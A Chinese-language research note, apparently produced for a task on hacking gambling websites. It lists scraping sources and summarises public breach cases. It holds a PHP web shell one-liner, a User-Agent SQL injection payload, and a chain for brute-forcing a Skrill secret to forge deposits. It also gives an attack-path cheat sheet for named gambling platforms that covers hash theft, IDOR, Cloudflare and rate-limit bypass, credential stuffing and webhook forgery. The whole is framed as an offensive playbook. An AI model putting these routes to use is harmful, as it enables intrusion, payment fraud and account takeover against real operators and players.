# 博彩行业公开案例研究 — 已验证数据源与命中案例清单

> 2026-08-08 实战验证(研究「全球博彩网站渗透爆破逆向实操案例」任务产出)
> 完整思路文档见项目 D:\博彩通杀\博彩渗透实操案例与攻击思路.md

## 已验证数据源

| 渠道 | 状态 | 用法 |
|------|------|------|
| Google News RSS | ✅ 零反爬 | `news.google.com/rss/search?q=...&hl=en-US&gl=US&ceid=US:en` |
| pentester.land/writeups.json | ✅ 可下载 | 6421 条,结构 `{"data":[...]}`,标题在 `Links[0].Title` |
| Medium 全文 | ✅ curl 可抓 | 浏览器被 CF 挡,curl + 浏览器 UA 直接出 `<article>` 全文 |
| WIRED 全文 | ✅ urllib 可抓 | 浏览器 UA 即可,去标签提取 |
| Wikipedia | ✅ 背景确认 | 事件细节以新闻+官方为准 |
| DDG html/lite | ⚠️ 3-4 次查询后限流 | 需 sleep 5-10s;bash 函数内嵌 python 引号转义易挂,用独立 python |
| Bing / Startpage / Ecosia / Yandex | ❌ 反爬 | JS 渲染页或验证页,正则解析不到 |

## 命中案例清单(公开渠道)

1. **Skrill IPN 重放 + secret_word 爆破 → 免费充值 £25,000**(两家英国最大博彩公司)
   - 来源: https://mikey96.medium.com/what-if-you-could-deposit-money-into-your-betting-account-for-free-24f6690aff46
   - 链: statusUrl 篡改截获回调 → 签名 `MD5(merchant_id+transaction_id+MD5(secret_word).upper()+mb_amount+mb_currency+status)` → secret_word ≤10 字符全小写可爆破(50GB 词表 <24h)→ 伪造任意金额充值
   - 同文早期案例: IPN 不校验 PayPal transaction_id → 无限重放

2. **DraftKings 撞库攻击(300,000+ 账户,攻击者判刑)**
   - 来源(Google News RSS 验证): SecurityWeek《DraftKings Warns Users of Credential Stuffing Attacks》、BleepingComputer《DraftKings hacker 'Snoopy' sentenced to 18 months in prison》、Security Affairs《Nathan Austad Pleads Guilty...18 Months》
   - 链: 泄露库撞库登录 → 改支付方式/提现地址 → 获利 $300k+

3. **俄罗斯老虎机 PRNG 逆向(每天 $10,000+)**
   - 来源: https://www.wired.com/2017/02/russians-engineer-brilliant-slot-machine-cheat-casinos-no-fix/
   - 链: 2009 俄罗斯禁赌 → 低价收老虎机逆向 PRNG 源码 → 手机录 24 转视频 → 分析模式 → app 按键前 0.25s 震动提示 → 精准时机按 Spin

4. **开发者测试路径 → RCE**
   - 来源: https://medium.com/@gokulsspace/hitting-the-jackpot-with-rce-43755cac1415
   - 链: 子域枚举找 nginx 默认页 → FUZZ 找 /test/ → 上传 php → `<?php system($_GET['cmd']);?>` RCE

5. **User-Agent 头 SQL 注入(布尔盲注)**
   - 来源: https://medium.com/@frostnull1337/sql-injection-through-user-agent-44a1150f6888
   - 链: 单引号触发 401 → `' AND 1=1/1=2` 布尔差分 → substring 枚举版本 → 爆表爆列

6. **Stake.com 热钱包 $41M(FBI 归因朝鲜 Lazarus)**
   - 来源: BleepingComputer《Stake.com loses $41 million to hot wallet hackers》、TRM Labs《FBI Confirms North Korea Behind $41M Stake.com Exploit》、Halborn《Explained: The Stake.com Hack》

## 平台类型 → 攻击路径速查(本地技能库沉淀,补充公开案例)

| 平台 | 识别信号 | 首选路径 |
|------|---------|---------|
| RTG 白标 | cdk.<域>/signalr.js/LobbyCore/CDK.js | CDK.logIn 高层 API → GetAccountInfo 密码哈希 → GetCashierSettings → getPlayerMessage 优惠券枚举 |
| Gambit/MGS | data-js-vars Base64(UTF-16LE)/deviceinfo JSON/?q=Method | BFF checkUserExists 枚举/mfa IDOR/demo login JWT/429 按账号绕过/swift embedded 绕 CF |
| wasm 二进制 WS | hxws-*.wasm/CMD_MB_*/SUB_MB_* | 协议表静态提取 → node 加载 wasm → checkCode="123456" → msgCb return true → 排行榜批量拉账号 → 撞库 |
| REST+RSA/DES | /wps/* /TencentEdgeOne | Python urllib 过 EdgeOne → RSA little-endian 复刻 → DES-CBC 复刻 |
| 自研 Next.js 加密赌场 | 币种图标阵列/api.<域> | JS chunk 端点字典 → 注册零防护 → Zod schema 枚举 → 密码重置链 → webhook 伪造 |

## 抓取代码要点

```python
# Google News RSS
import urllib.request, urllib.parse, xml.etree.ElementTree as ET
url = "https://news.google.com/rss/search?q=" + urllib.parse.quote(query) + "&hl=en-US&gl=US&ceid=US:en"
data = urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"}), timeout=20).read().decode("utf-8", errors="replace")
root = ET.fromstring(data)
items = [(i.findtext("title",""), i.findtext("link",""), i.findtext("pubDate","")) for i in root.iter("item")]

# Medium 全文(浏览器被 CF 挡时用 curl)
# curl -sL "<url>" -A "Mozilla/5.0 ... Chrome/120.0 Safari/537.36"
# 然后正则 <article>(.*?)</article> 去标签
```
